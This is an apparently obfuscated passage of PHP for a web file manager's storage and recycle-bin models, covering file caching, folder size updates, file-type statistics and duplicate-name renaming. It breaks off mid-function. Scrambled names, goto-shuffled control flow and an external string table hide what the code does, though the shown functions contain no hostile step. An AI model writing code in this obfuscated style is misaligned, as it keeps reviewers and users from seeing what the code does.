$fˆì⁄º‹∑π =& $_SERVER[∞„˜ƒÑºª]; $d◊åªá∂ö¶ = array($fˆì⁄º‹∑π[384] => $D¶éö≤Ò˘í); if (!is_null($f“é√ë‘‚æ)) { $d◊åªá∂ö¶[$fˆì⁄º‹∑π[375]] = $f“é√ë‘‚æ; } $aÍº“‹ÉÉÂ = $this->where($d◊åªá∂ö¶)->limit(1); return $aÍº“‹ÉÉÂ ? !0 : !1; } public function getContent($Eı»£Ø’ßÉ) { goto d™∆ü—≈úÒ; d™∆ü—≈úÒ: $Döúõ∫ûµâ =& $_SERVER[∞„˜ƒÑºª]; $aπÓ†“à≥« = $this->fileInfoGet($Eı»£Ø’ßÉ); if (!$aπÓ†“à≥«) { return !1; } goto B™ä´€Ï’“; B™ä´€Ï’“: if ($aπÓ†“à≥«[$Döúõ∫ûµâ[86]] == 0) { return $Döúõ∫ûµâ[33]; } $FÇ’Ûπñçõ = $Döúõ∫ûµâ[1732] . $aπÓ†“à≥«[$Döúõ∫ûµâ[159]]; if ($aπÓ†“à≥«[$Döúõ∫ûµâ[86]] <= 1024 * 10) { $fâï∑˜¥åº = Cache::get($FÇ’Ûπñçõ); if (!$fâï∑˜¥åº) { $fâï∑˜¥åº = IO::getContent($aπÓ†“à≥«[$Döúõ∫ûµâ[84]]); Cache::set($FÇ’Ûπñçõ, $fâï∑˜¥åº); } return $fâï∑˜¥åº; } goto DŒë‘Ü√ÿ»; DŒë‘Ü√ÿ»: return IO::getContent($aπÓ†“à≥«[$Döúõ∫ûµâ[84]]); goto eàáóÑ™çâ; eàáóÑ™çâ: } public function setDesc($açòîØÖÍé, $fäˆ–ÒÓ„) { $fÛØ∫å¯ ¡ =& $_SERVER[∞„˜ƒÑºª]; Model($fÛØ∫å¯ ¡[381])->eventAddDesc($açòîØÖÍé, $fäˆ–ÒÓ„); return $this->metaSet($açòîØÖÍé, $fÛØ∫å¯ ¡[1560], $fäˆ–ÒÓ„); } public function setContent($A—°ª≠Ó˘ß, $Aœ¡ı‚ΩÉ° = '') { goto E´∂Ö‡€¬ﬂ; Fö»˜‰Üœà: if (!$FŸ˘–ﬂµîØ || !$e»√œÍÓÔö) { return !1; } $cÈéµÏ«Àè = Model($cÏ¥ÖÑø¬‘[426])->addFileByContent($Aœ¡ı‚ΩÉ°, $e»√œÍÓÔö[$cÏ¥ÖÑø¬‘[28]]); $C¯öπ¥∂Ôê = $this->fileHistory($e»√œÍÓÔö, $cÈéµÏ«Àè[$cÏ¥ÖÑø¬‘[382]], $cÈéµÏ«Àè[$cÏ¥ÖÑø¬‘[86]]); goto c÷ûïµ√ûÙ; c÷ûïµ√ûÙ: if (!$C¯öπ¥∂Ôê) { return Model($cÏ¥ÖÑø¬‘[426])->remove($cÈéµÏ«Àè[$cÏ¥ÖÑø¬‘[382]]); } $this->folderSizeReset($e»√œÍÓÔö[$cÏ¥ÖÑø¬‘[384]]); return !0; goto e∑ûó‡’Àı; E´∂Ö‡€¬ﬂ: $cÏ¥ÖÑø¬‘ =& $_SERVER[∞„˜ƒÑºª]; $e»√œÍÓÔö = $this->sourceInfo($A—°ª≠Ó˘ß); $FŸ˘–ﬂµîØ = $this->fileInfoGet($A—°ª≠Ó˘ß); goto Fö»˜‰Üœà; e∑ûó‡’Àı: } public function fileSubstr($Bà¬„ã’Ñ≥, $AêÚòÃ¢æô, $d¥≈Ø§‘ôÁ) { $D±Ç«È◊¢÷ = $this->fileInfoGet($Bà¬„ã’Ñ≥); if (!$D±Ç«È◊¢÷) { return !1; } return IO::fileSubstr($D±Ç«È◊¢÷[$_SERVER[∞„˜ƒÑºª][84]], $AêÚòÃ¢æô, $d¥≈Ø§‘ôÁ); } public function fileInfoGet($aÇÓÔë°‹é) { goto CãÇ√ ôçŒ; CÕè√◊é€ª: if ($c‹ÆÑÙÍí∂) { $c‹ÆÑÙÍí∂[$C≤Øıæ◊˜•[28]] = $D∏áﬁÙ◊ÕÁ[$C≤Øıæ◊˜•[28]]; } return $c‹ÆÑÙÍí∂; goto B¿—ÈÒÍıÍ; Eë¿«Ó¿¥™: $cäêÀﬂìÃË = $C≤Øıæ◊˜•[1733]; $eÑÃ–∏ﬁÒå = array($C≤Øıæ◊˜•[390] => $D∏áﬁÙ◊ÕÁ[$C≤Øıæ◊˜•[382]]); $c‹ÆÑÙÍí∂ = Model($C≤Øıæ◊˜•[1459])->field($cäêÀﬂìÃË)->where($eÑÃ–∏ﬁÒå)->find(); goto CÕè√◊é€ª; CãÇ√ ôçŒ: $C≤Øıæ◊˜• =& $_SERVER[∞„˜ƒÑºª]; $D∏áﬁÙ◊ÕÁ = $this->sourceInfo($aÇÓÔë°‹é); if (!$D∏áﬁÙ◊ÕÁ || $D∏áﬁÙ◊ÕÁ[$C≤Øıæ◊˜•[375]]) { return !1; } goto Eë¿«Ó¿¥™; B¿—ÈÒÍıÍ: } private function folderChildrenNumber($cœ÷¬≤äº°) { $c◊£í®Ôè“ =& $_SERVER[∞„˜ƒÑºª]; $CõÚë¶«ó‰ = $this->sourceInfo($cœ÷¬≤äº°); $CÈéü‚é˜Ú = array($c◊£í®Ôè“[399] => array($c◊£í®Ôè“[408], $CõÚë¶«ó‰[$c◊£í®Ôè“[373]] . $cœ÷¬≤äº° . $c◊£í®Ôè“[409]), $c◊£í®Ôè“[400] => 0, $c◊£í®Ôè“[386] => 1); $Cî’Œô¬äé = $this->where($CÈéü‚é˜Ú)->count(); $f÷„Û∫›≈¡ = $this->where($CÈéü‚é˜Ú)->where(array($c◊£í®Ôè“[386] => 0))->count(); return array($c◊£í®Ôè“[90] => $f÷„Û∫›≈¡, $c◊£í®Ôè“[91] => $Cî’Œô¬äé); } public static $cachePathInfo = array(); public function pathInfo($F√©€åæ≈Á, $eæù‘óïÎâ = false) { goto AÉ§æÍ ´—; Bâç™ûﬁı⁄: return $cÉ¯ﬂâöê¯; goto cÔÔ∆êÊ÷ª; c¿¥Ó–‡∂—: if (!$cÉ¯ﬂâöê¯) { return !1; } $cÉ¯ﬂâöê¯ = $this->_listDataApplyItem($cÉ¯ﬂâöê¯, $eæù‘óïÎâ); self::$cachePathInfo[$F√©€åæ≈Á] = $cÉ¯ﬂâöê¯; goto Bâç™ûﬁı⁄; AÉ§æÍ ´—: $C”∑ÍŸÌõî = _get(self::$cachePathInfoMore, $F√©€åæ≈Á); if ($C”∑ÍŸÌõî) { return $C”∑ÍŸÌõî; } $cÉ¯ﬂâöê¯ = $this->sourceInfo($F√©€åæ≈Á); goto c¿¥Ó–‡∂—; cÔÔ∆êÊ÷ª: } public static $cachePathInfoMore = array(); public function pathInfoMore($cääÖËØ»ã) { goto d—È⁄›é¥Ñ; d—È⁄›é¥Ñ: $eâ¯ï∫›É‡ =& $_SERVER[∞„˜ƒÑºª]; $C†åú¿¶°∂ = _get(self::$cachePathInfoMore, $cääÖËØ»ã); if ($C†åú¿¶°∂) { return $C†åú¿¶°∂; } goto Bêû∆ô“Ê; Fﬂø∑Ì•‡È: self::$cachePathInfoMore[$cääÖËØ»ã] = $D¿û¯ÆºÉﬁ; return $D¿û¯ÆºÉﬁ; goto EÑÃ±â◊¬ÿ; Bêû∆ô“Ê: $D¿û¯ÆºÉﬁ = $this->pathInfo($cääÖËØ»ã); if (!$D¿û¯ÆºÉﬁ) { return !1; } if ($D¿û¯ÆºÉﬁ[$eâ¯ï∫›É‡[375]] == $eâ¯ï∫›É‡[376]) { $D¿û¯ÆºÉﬁ[$eâ¯ï∫›É‡[89]] = $this->folderChildrenNumber($cääÖËØ»ã); } else { $D¿û¯ÆºÉﬁ[$eâ¯ï∫›É‡[158]] = $this->fileInfoGet($cääÖËØ»ã); unset($D¿û¯ÆºÉﬁ[$eâ¯ï∫›É‡[158]][$eâ¯ï∫›É‡[84]]); } goto Fﬂø∑Ì•‡È; EÑÃ±â◊¬ÿ: } public function sourceInfo($bÒ˘ΩÁ∏¯ê) { $føãè¨Ÿ≥¢ =& $_SERVER[∞„˜ƒÑºª]; $CÿÉ»ÑæΩ‹ = $føãè¨Ÿ≥¢[1734] . $bÒ˘ΩÁ∏¯ê; $EóœÖ€ΩõÇ = _get(self::$cacheSourceInfo, $CÿÉ»ÑæΩ‹); if ($EóœÖ€ΩõÇ) { return $EóœÖ€ΩõÇ; } self::$cacheSourceInfo[$CÿÉ»ÑæΩ‹] = $this->where(array($føãè¨Ÿ≥¢[374] => $bÒ˘ΩÁ∏¯ê))->find(); return self::$cacheSourceInfo[$CÿÉ»ÑæΩ‹]; } public function sourceCacheClear($DÍÓØº∫√£ = false) { if ($DÍÓØº∫√£ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[∞„˜ƒÑºª][1734] . $DÍÓØº∫√£]); } public function pathInfoByPath($EîÕÏ§§›…, $dúÆâ†ƒÖ¶) { $aè≥ƒŒçﬁ› =& $_SERVER[∞„˜ƒÑºª]; $Cä•Ø£ÔŒÑ = !$dúÆâ†ƒÖ¶ ? array() : explode($aè≥ƒŒçﬁ›[8], trim($dúÆâ†ƒÖ¶, $aè≥ƒŒçﬁ›[8])); $aùΩçÿ∫É≥ = $EîÕÏ§§›…; foreach ($Cä•Ø£ÔŒÑ as $aã‹Âî¿ßì) { $BÚ®“’Ø‹ﬁ = array($aè≥ƒŒçﬁ›[384] => $aùΩçÿ∫É≥, $aè≥ƒŒçﬁ›[28] => $aã‹Âî¿ßì); $F†Î¨ÎãÇ  = $this->where($BÚ®“’Ø‹ﬁ)->select(); if (!$F†Î¨ÎãÇ ) { return !1; } $F†Î¨ÎãÇ  = array_sort_by($F†Î¨ÎãÇ , $aè≥ƒŒçﬁ›[410]); $aùΩçÿ∫É≥ = $F†Î¨ÎãÇ [0][$aè≥ƒŒçﬁ›[374]]; } return $this->pathInfo($aùΩçÿ∫É≥, !0); } protected function updateModifyTime($cÍπÀÛ∆äÍ) { goto BÉËÒí≥°à; A⁄®‘π´ã„: foreach ($cÍπÀÛ∆äÍ as $bÇ€≈ÒÌ¶ß => $CüÇøªÊÊ∂) { $cÍπÀÛ∆äÍ[$bÇ€≈ÒÌ¶ß] = intval($CüÇøªÊÊ∂); } $dµ¯‡»”Ñù = array($DÛÖ‚ÜÖÌê[374] => array($DÛÖ‚ÜÖÌê[7], $cÍπÀÛ∆äÍ)); $eÂƒˆ´’ÁÏ = array($DÛÖ‚ÜÖÌê[397] => USER_ID, $DÛÖ‚ÜÖÌê[1727] => time()); goto eÈê∂ÌÖÚ∆; BÉËÒí≥°à: $DÛÖ‚ÜÖÌê =& $_SERVER[∞„˜ƒÑºª]; if (!$cÍπÀÛ∆äÍ) { return; } if (!is_array($cÍπÀÛ∆äÍ)) { $cÍπÀÛ∆äÍ = array($cÍπÀÛ∆äÍ); } goto A⁄®‘π´ã„; eÈê∂ÌÖÚ∆: $this->where($dµ¯‡»”Ñù)->save($eÂƒˆ´’ÁÏ); goto bÎ´êÉ•Ñ∆; bÎ´êÉ•Ñ∆: } public function folderSizeReset($eå∫¢âÇ≤ô) { goto Dì‡‡Ÿÿ˘ï; A˜£π£ÎÊô: CacheLock::unlock($DœÀÂÈôêÉ); goto d±â∂Â¡ëŒ; dêÇ⁄∑¶§Œ: $B•Ü‘ÛÃŸˆ = array($BÛªÑÎùﬂå[398] => $eå∫¢âÇ≤ô, $BÛªÑÎùﬂå[400] => 0); $cÛº·‚◊§¬ = $this->where($B•Ü‘ÛÃŸˆ)->sum($BÛªÑÎùﬂå[86]); $cÛº·‚◊§¬ = intval($cÛº·‚◊§¬); goto eáÌÓãô˘‚; Dì‡‡Ÿÿ˘ï: $BÛªÑÎùﬂå =& $_SERVER[∞„˜ƒÑºª]; if ($this->statusIgnoreResetSpace) { return; } $DœÀÂÈôêÉ = $BÛªÑÎùﬂå[1735] . $eå∫¢âÇ≤ô; goto D¢Ñ˜∂êÿä; D¢Ñ˜∂êÿä: CacheLock::lock($DœÀÂÈôêÉ, 20); $this->sourceCacheClear($eå∫¢âÇ≤ô); $a£∂¯çƒÆ∂ = $this->sourceInfo($eå∫¢âÇ≤ô); goto dêÇ⁄∑¶§Œ; eáÌÓãô˘‚: $eÀùÖ›£› = $cÛº·‚◊§¬ - intval($a£∂¯çƒÆ∂[$BÛªÑÎùﬂå[86]]); if ($eÀùÖ›£› == 0) { return CacheLock::unlock($DœÀÂÈôêÉ); } $this->where(array($BÛªÑÎùﬂå[414] => $eå∫¢âÇ≤ô))->setField($BÛªÑÎùﬂå[86], $cÛº·‚◊§¬); goto Eô÷ÇÀÿÕÁ; Eô÷ÇÀÿÕÁ: $D∞‡Ë∏åŸ≥ = $this->parentLevelArray($a£∂¯çƒÆ∂[$BÛªÑÎùﬂå[373]]); if ($D∞‡Ë∏åŸ≥) { $B•Ü‘ÛÃŸˆ = array($BÛªÑÎùﬂå[374] => array($BÛªÑÎùﬂå[951], $D∞‡Ë∏åŸ≥)); $this->where($B•Ü‘ÛÃŸˆ)->setAdd($BÛªÑÎùﬂå[86], $eÀùÖ›£›); } $this->targetSpaceUpdate($a£∂¯çƒÆ∂[$BÛªÑÎùﬂå[393]], $a£∂¯çƒÆ∂[$BÛªÑÎùﬂå[395]]); goto A˜£π£ÎÊô; d±â∂Â¡ëŒ: } public function folderSizeResetChildren($Fû≥≤˘ˆäù) { goto d‹Œäå«∂Œ; c“ô÷ñéÇ„: foreach ($e⁄◊·é›ÊÁ as $f†ﬁ°¶Üç°) { if ($f†ﬁ°¶Üç°[$EΩ›Ó£√ÆÃ[86]] == $f†ﬁ°¶Üç°[$EΩ›Ó£√ÆÃ[1737]]) { continue; } $FÇœ‰â®æÓ[] = array($EΩ›Ó£√ÆÃ[374], $f†ﬁ°¶Üç°[$EΩ›Ó£√ÆÃ[374]], $EΩ›Ó£√ÆÃ[86], $f†ﬁ°¶Üç°[$EΩ›Ó£√ÆÃ[86]]); } $this->saveAll($FÇœ‰â®æÓ); goto e‚ØÊÖ¶ï“; C√ïÔã‹©Ω: $Fû¶›çû¶±[$EΩ›Ó£√ÆÃ[375]] = 0; $f◊Ê©ù‰»† = $this->field($A‰ü‹á„¥ì)->where($Fû¶›çû¶±)->select(); if (!$f◊Ê©ù‰»†) { return; } goto fôñú¯Û·Æ; fôñú¯Û·Æ: $e⁄◊·é›ÊÁ[] = $Cë§’Ëµ¶‚; $e⁄◊·é›ÊÁ = array_to_keyvalue($e⁄◊·é›ÊÁ, $EΩ›Ó£√ÆÃ[374]); foreach ($e⁄◊·é›ÊÁ as $BÔàΩÜ€Ìˆ => $f†ﬁ°¶Üç°) { $e⁄◊·é›ÊÁ[$BÔàΩÜ€Ìˆ][$EΩ›Ó£√ÆÃ[1737]] = $e⁄◊·é›ÊÁ[$BÔàΩÜ€Ìˆ][$EΩ›Ó£√ÆÃ[86]]; $e⁄◊·é›ÊÁ[$BÔàΩÜ€Ìˆ][$EΩ›Ó£√ÆÃ[86]] = 0; } goto Fê§©™Í√ﬁ; Fê§©™Í√ﬁ: foreach ($f◊Ê©ù‰»† as $f†ﬁ°¶Üç°) { $däË≠§Óæü = $f†ﬁ°¶Üç°[$EΩ›Ó£√ÆÃ[384]] . $EΩ›Ó£√ÆÃ[33]; if (!isset($e⁄◊·é›ÊÁ[$däË≠§Óæü])) { continue; } if ($f†ﬁ°¶Üç°[$EΩ›Ó£√ÆÃ[410]] == $e⁄◊·é›ÊÁ[$däË≠§Óæü][$EΩ›Ó£√ÆÃ[410]]) { $e⁄◊·é›ÊÁ[$däË≠§Óæü][$EΩ›Ó£√ÆÃ[86]] += $f†ﬁ°¶Üç°[$EΩ›Ó£√ÆÃ[86]]; } } foreach ($e⁄◊·é›ÊÁ as $f†ﬁ°¶Üç°) { $CûÊƒ„Öô∆ = $this->parentLevelArray($f†ﬁ°¶Üç°[$EΩ›Ó£√ÆÃ[373]]); foreach ($CûÊƒ„Öô∆ as $däË≠§Óæü) { $däË≠§Óæü = $däË≠§Óæü . $EΩ›Ó£√ÆÃ[33]; if (!isset($e⁄◊·é›ÊÁ[$däË≠§Óæü])) { continue; } if ($f†ﬁ°¶Üç°[$EΩ›Ó£√ÆÃ[410]] == $e⁄◊·é›ÊÁ[$däË≠§Óæü][$EΩ›Ó£√ÆÃ[410]]) { $e⁄◊·é›ÊÁ[$däË≠§Óæü][$EΩ›Ó£√ÆÃ[86]] += $f†ﬁ°¶Üç°[$EΩ›Ó£√ÆÃ[86]]; } } } $FÇœ‰â®æÓ = array(); goto c“ô÷ñéÇ„; d‹Œäå«∂Œ: $EΩ›Ó£√ÆÃ =& $_SERVER[∞„˜ƒÑºª]; $this->sourceCacheClear($Fû≥≤˘ˆäù); $Cë§’Ëµ¶‚ = $this->sourceInfo($Fû≥≤˘ˆäù); goto câ¿«Êõ˜¯; câ¿«Êõ˜¯: $Fû¶›çû¶± = array($EΩ›Ó£√ÆÃ[386] => 1, $EΩ›Ó£√ÆÃ[399] => array($EΩ›Ó£√ÆÃ[408], $Cë§’Ëµ¶‚[$EΩ›Ó£√ÆÃ[373]] . $Fû≥≤˘ˆäù . $EΩ›Ó£√ÆÃ[409])); $A‰ü‹á„¥ì = $EΩ›Ó£√ÆÃ[1736]; $e⁄◊·é›ÊÁ = $this->field($A‰ü‹á„¥ì)->where($Fû¶›çû¶±)->select(); goto C√ïÔã‹©Ω; e‚ØÊÖ¶ï“: } public function targetSpaceUpdate($D£∆Ãπ•§‡, $e Ê–¬»Ÿ·) { $BÎÛ Æ˜È™ =& $_SERVER[∞„˜ƒÑºª]; if (!in_array($D£∆Ãπ•§‡, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $B¬≈ÉÒ‰Çæ = $this->targetSpaceSize($D£∆Ãπ•§‡, $e Ê–¬»Ÿ·); if ($D£∆Ãπ•§‡ == self::TYPE_USER) { Model($BÎÛ Æ˜È™[1675])->userEdit($e Ê–¬»Ÿ·, array($BÎÛ Æ˜È™[1502] => $B¬≈ÉÒ‰Çæ)); } else { if ($D£∆Ãπ•§‡ == self::TYPE_GROUP) { Model($BÎÛ Æ˜È™[1669])->groupEdit($e Ê–¬»Ÿ·, array($BÎÛ Æ˜È™[1502] => $B¬≈ÉÒ‰Çæ)); } } } public function targetSpaceSize($aÜ·°óˆ£Ö, $Eâ•≈ºß¶ˆ) { goto AÛÆ¯ËÕ’ˆ; f¶≠ì≈©ÜÜ: $báêÌÂßø´ = floatval($Dë†Ω¬ÖÖá[$B√‡ëÜØùˆ[86]]); $Fù„õòÃáû = array($B√‡ëÜØùˆ[399] => array($B√‡ëÜØùˆ[408], $B√‡ëÜØùˆ[1595] . $Dë†Ω¬ÖÖá[$B√‡ëÜØùˆ[374]] . $B√‡ëÜØùˆ[1738])); $B£çÁÂêﬁÑ = Model($B√‡ëÜØùˆ[1739])->field($B√‡ëÜØùˆ[414])->where($Fù„õòÃáû)->select(); goto D∂Ñ•Ëè‰ª; AÛÆ¯ËÕ’ˆ: $B√‡ëÜØùˆ =& $_SERVER[∞„˜ƒÑºª]; $Dë†Ω¬ÖÖá = $this->sourceRoot($aÜ·°óˆ£Ö, $Eâ•≈ºß¶ˆ, !0); if (!$Dë†Ω¬ÖÖá) { return 0; } goto f¶≠ì≈©ÜÜ; D∂Ñ•Ëè‰ª: $B£çÁÂêﬁÑ = array_to_keyvalue($B£çÁÂêﬁÑ, $B√‡ëÜØùˆ[33], $B√‡ëÜØùˆ[374]); if ($B£çÁÂêﬁÑ) { $Fù„õòÃáû = array($B√‡ëÜØùˆ[414] => array($B√‡ëÜØùˆ[951], $B£çÁÂêﬁÑ)); $báêÌÂßø´ += floatval($this->where($Fù„õòÃáû)->sum($B√‡ëÜØùˆ[86])); } return $báêÌÂßø´; goto D’—ˆ∏ô∏ä; D’—ˆ∏ô∏ä: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($B∏¶ÖÆˆ›) { return $this->fileTypeProfile($B∏¶ÖÆˆ›, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Fì‘÷ÃÉô¿) { return $this->fileTypeProfile($Fì‘÷ÃÉô¿, SourceModel::TYPE_GROUP); } private function fileTypeProfile($cúû—∏±èÉ, $FÇ÷é°™êÀ) { goto Dâ’⁄º’Çâ; bœ√ï…¬÷™: $f≈Ûå√›èË = array(); $f≈Ûå√›èË[$Fê≈©—÷ÈÉ[1740]] = array($Fê≈©—÷ÈÉ[1741] => LNG($Fê≈©—÷ÈÉ[1740]), $Fê≈©—÷ÈÉ[1742] => $this->where($FÂÍ®“àÔØ)->count(), $Fê≈©—÷ÈÉ[391] => $this->where($FÂÍ®“àÔØ)->sum($Fê≈©—÷ÈÉ[86])); $Eóâã±æ‰º = KodIO::fileTypeList(); goto eó¶òÜëáÛ; eó¶òÜëáÛ: foreach ($Eóâã±æ‰º as $Aùûÿ‹Úé∏ => $e†ù…Çå´¿) { $FÂÍ®“àÔØ[$Fê≈©—÷ÈÉ[389]] = $this->fileTypeWhere($Aùûÿ‹Úé∏); $f≈Ûå√›èË[$Aùûÿ‹Úé∏] = array($Fê≈©—÷ÈÉ[1741] => $e†ù…Çå´¿[$Fê≈©—÷ÈÉ[28]], $Fê≈©—÷ÈÉ[1742] => $this->where($FÂÍ®“àÔØ)->count(), $Fê≈©—÷ÈÉ[391] => $this->where($FÂÍ®“àÔØ)->sum($Fê≈©—÷ÈÉ[86])); } return $f≈Ûå√›èË; goto Aß∞è∂Éü∞; Dâ’⁄º’Çâ: $Fê≈©—÷ÈÉ =& $_SERVER[∞„˜ƒÑºª]; $FÂÍ®“àÔØ = array($Fê≈©—÷ÈÉ[386] => 0); if ($cúû—∏±èÉ != !1) { $FÂÍ®“àÔØ[$Fê≈©—÷ÈÉ[395]] = $cúû—∏±èÉ; $FÂÍ®“àÔØ[$Fê≈©—÷ÈÉ[393]] = $FÇ÷é°™êÀ; } goto bœ√ï…¬÷™; Aß∞è∂Éü∞: } public function fileNameExist($A≈ŸÇµµ§ó, $dœà∑π’ÎÉ) { $E§¢Öàïí˘ =& $_SERVER[∞„˜ƒÑºª]; $eœﬂ–πÇÈº = $this->childList($A≈ŸÇµµ§ó); foreach ($eœﬂ–πÇÈº as $Bµô©≠∞®–) { if (strtolower($Bµô©≠∞®–[$E§¢Öàïí˘[28]]) == strtolower($dœà∑π’ÎÉ)) { return $Bµô©≠∞®–[$E§¢Öàïí˘[374]]; } } return !1; } public function childList($b¢í∂ˆ◊±∑) { $dŸÛÙôîÍ≥ =& $_SERVER[∞„˜ƒÑºª]; $A≈óÆ†£⁄Æ = array($dŸÛÙôîÍ≥[384] => intval($b¢í∂ˆ◊±∑), $dŸÛÙôîÍ≥[410] => 0); $b≤Õ∏ƒ⁄∞Ë = $this->cacheMemory()->where($A≈óÆ†£⁄Æ)->select(); $b≤Õ∏ƒ⁄∞Ë = $b≤Õ∏ƒ⁄∞Ë ? $b≤Õ∏ƒ⁄∞Ë : array(); foreach ($b≤Õ∏ƒ⁄∞Ë as $DΩúËÂôÉŸ) { $eÉÂäç–ˆÍ = $dŸÛÙôîÍ≥[1734] . $DΩúËÂôÉŸ[$dŸÛÙôîÍ≥[374]]; self::$cacheSourceInfo[$eÉÂäç–ˆÍ] = $DΩúËÂôÉŸ; } return $b≤Õ∏ƒ⁄∞Ë; } public function fileNameAuto($b∏ÈßÍ€öÕ, $CÀºè¢ÉØÈ, $fïáœê√‡¯ = REPEAT_RENAME, $EàËìñ«ÙÀ = false) { $c“Õ”ªÀàâ =& $_SERVER[∞„˜ƒÑºª]; $C™œ«õã≠› = $this->childList($b∏ÈßÍ€öÕ); $c…ˆãü˜≠£ = array_to_keyvalue($C™œ«õã≠›, $c“Õ”ªÀàâ[33], $c“Õ”ªÀàâ[28]); return $this->fileNameAutoGet($c…ˆãü˜≠£, $CÀºè¢ÉØÈ, $fïáœê√‡¯, $EàËìñ«ÙÀ); } public function fileNameAutoGet($EôñªØôúÏ, $C¯éÇªìå˘, $aÕèÃ∫›¥ﬁ, $eâ—œô“ÜÃ) { $b·Ï°≈‚–≥ =& $_SERVER[∞„˜ƒÑºª]; if ($aÕèÃ∫›¥ﬁ == REPEAT_REPLACE || !$EôñªØôúÏ || !in_array_not_case($C¯éÇªìå˘, $EôñªØôúÏ) || $eâ—œô“ÜÃ && $aÕèÃ∫›¥ﬁ != REPEAT_RENAME_FOLDER) { return $C¯éÇªìå˘; } if ($aÕèÃ∫›¥ﬁ == REPEAT_SKIP) { return !1; } $Cë…ØËº¶ó = $b·Ï°≈‚–≥[98] . get_path_ext($C¯éÇªìå˘); $Cë…ØËº¶ó = $Cë…ØËº¶ó == $b·Ï°≈‚–≥[98] || $eâ—œô“ÜÃ ? $b·Ï°≈‚–≥[33] : $Cë…ØËº¶ó; for ($AïåºàÊˆ– = 1; $AïåºàÊˆ– <= count($EôñªØôúÏ) + 1; $AïåºàÊˆ–++) { $DÕ∑Ú¶¿€ø = substr($C¯éÇªìå˘, 0, strlen($C¯éÇªìå˘) - strlen($Cë…ØËº¶ó)); $açÆ∏Æ§¡Ñ = $DÕ∑Ú¶¿€ø . "\x28{$AïåºàÊˆ–}\x29{$Cë…ØËº¶ó}"; if (!in_array_not_case($açÆ∏Æ§¡Ñ, $EôñªØôúÏ)) { return $açÆ∏Æ§¡Ñ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\165\162\143\x65\137\162\145\x63\x79\x63\x6c\x65"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\x65\124\x69\x6d\x65", "\164\151\155\x65", "\151\156\x73\x65\x72\x74", "\146\x75\156\143\x74\151\157\156")); public function listData($D…ŸÑù®Øı = false) { $AÛË†ºç”“ =& $_SERVER[∞„˜ƒÑºª]; $D…ŸÑù®Øı = $D…ŸÑù®Øı ? $D…ŸÑù®Øı : USER_ID; $aåÏÇÚÆ◊è = $this->where(array($AÛË†ºç”“[1054] => $D…ŸÑù®Øı))->select(); return array_to_keyvalue($aåÏÇÚÆ◊è, $AÛË†ºç”“[33], $AÛË†ºç”“[374]); } public function moveToRecycle($F∑œ†∑™Øπ) { goto e…√Ç≤ÿŒ´; e«Ü∏ãÁí◊: if (!$cäÓÍøêø  || $cäÓÍøêø [$bπ†¡©ì÷‚[410]] == $bπ†¡©ì÷‚[376]) { return; } $D®÷ç‰–«« = array($bπ†¡©ì÷‚[414] => $F∑œ†∑™Øπ, $bπ†¡©ì÷‚[1054] => USER_ID, $bπ†¡©ì÷‚[392] => $cäÓÍøêø [$bπ†¡©ì÷‚[393]], $bπ†¡©ì÷‚[394] => $cäÓÍøêø [$bπ†¡©ì÷‚[395]], $bπ†¡©ì÷‚[399] => $cäÓÍøêø [$bπ†¡©ì÷‚[373]]); $this->add($D®÷ç‰–««); goto eÖÚå€¨úó; eÖÚå€¨úó: $this->recycleMove($F∑œ†∑™Øπ, 1); if ($cäÓÍøêø [$bπ†¡©ì÷‚[375]] == $bπ†¡©ì÷‚[376]) { $BÑè©“è‚· = array($bπ†¡©ì÷‚[399] => array($bπ†¡©ì÷‚[408], $cäÓÍøêø [$bπ†¡©ì÷‚[373]] . $F∑œ†∑™Øπ . $bπ†¡©ì÷‚[409])); $Aâ®‰Ñ¢Óá->where($BÑè©“è‚·)->setField($bπ†¡©ì÷‚[410], 1); } goto cúºèó›—°; e…√Ç≤ÿŒ´: $bπ†¡©ì÷‚ =& $_SERVER[∞„˜ƒÑºª]; $Aâ®‰Ñ¢Óá = Model($bπ†¡©ì÷‚[832]); $cäÓÍøêø  = $Aâ®‰Ñ¢Óá->sourceInfo($F∑œ†∑™Øπ); goto e«Ü∏ãÁí◊; cúºèó›—°: } public function clear() { $this->remove(!1); } public function remove($eπ›†¡™ïû = false) { goto aÚ◊™‰ÔÓ€; dî„»üú◊°: foreach ($fÀ›ƒ’‚„® as $FÍ˜∞ùÂé±) { $cœ‚ÀüÉ´™->targetSpaceUpdate($FÍ˜∞ùÂé±[$BπŒ˜‚àúÑ[393]], $FÍ˜∞ùÂé±[$BπŒ˜‚àúÑ[395]]); } goto D±Ú‘≈Î“‰; F†ÌùúÏœå: $eπ›†¡™ïû = $eπ›†¡™ïû === !1 ? !1 : $eπ›†¡™ïû; $fÀ›ƒ’‚„® = array(); foreach ($BÒ≤ëˆêß© as $eı°ÜÜê¢à) { if ($eπ›†¡™ïû != !1 && !in_array($eı°ÜÜê¢à, $eπ›†¡™ïû)) { continue; } $d´“”ËÊã§ = $this->where(array($BπŒ˜‚àúÑ[374] => $eı°ÜÜê¢à))->find(); $cÂ…ÿı˘ÂÌ = $d´“”ËÊã§[$BπŒ˜‚àúÑ[393]] . $BπŒ˜‚àúÑ[79] . $d´“”ËÊã§[$BπŒ˜‚àúÑ[395]]; $fÀ›ƒ’‚„®[$cÂ…ÿı˘ÂÌ] = array($BπŒ˜‚àúÑ[392] => $d´“”ËÊã§[$BπŒ˜‚àúÑ[393]], $BπŒ˜‚àúÑ[395] => $d´“”ËÊã§[$BπŒ˜‚àúÑ[395]]); $this->where(array($BπŒ˜‚àúÑ[374] => $eı°ÜÜê¢à))->delete(); $cœ‚ÀüÉ´™->remove($eı°ÜÜê¢à, !1); } goto dî„»üú◊°; aÚ◊™‰ÔÓ€: $BπŒ˜‚àúÑ =& $_SERVER[∞„˜ƒÑºª]; $cœ‚ÀüÉ´™ = Model($BπŒ˜‚àúÑ[832]); $BÒ≤ëˆêß© = $this->listData(); goto F†ÌùúÏœå; D±Ú‘≈Î“‰: } public function restore($Bï¶Úœ≥Ó’ = false) { goto cä‹»ƒÛﬁ⁄; FöÖ¬ûÉ¨ó: $Bï¶Úœ≥Ó’ = $Bï¶Úœ≥Ó’ == !1 ? !1 : $Bï¶Úœ≥Ó’; if (!$e“ÿèÉœ∂Ì) { return 